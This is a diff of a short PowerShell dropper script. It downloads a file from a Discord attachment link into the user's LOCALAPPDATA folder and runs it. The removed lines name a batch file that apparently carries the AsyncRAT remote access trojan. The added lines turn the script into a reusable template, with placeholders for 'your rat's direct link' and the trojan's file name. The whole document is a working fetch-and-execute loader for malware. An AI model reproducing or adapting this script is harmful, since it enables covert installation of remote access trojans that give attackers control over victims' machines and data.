@@ -1,6 +1,6 @@
 ﻿cd $env:LOCALAPPDATA
 
-Invoke-WebRequest -URI https://cdn.discordapp.com/attachments/1020829026828435547/1020832897273446430/AsyncClientaras.bat -OutFile yenemezsinki.bat
+Invoke-WebRequest -URI your rat's direct link -OutFile your rat's name.extension
 
 cd $env:LOCALAPPDATA
-start "$env:LOCALAPPDATA\yenemezsinki.bat"
+start "$env:LOCALAPPDATA\your rat's name.extension"
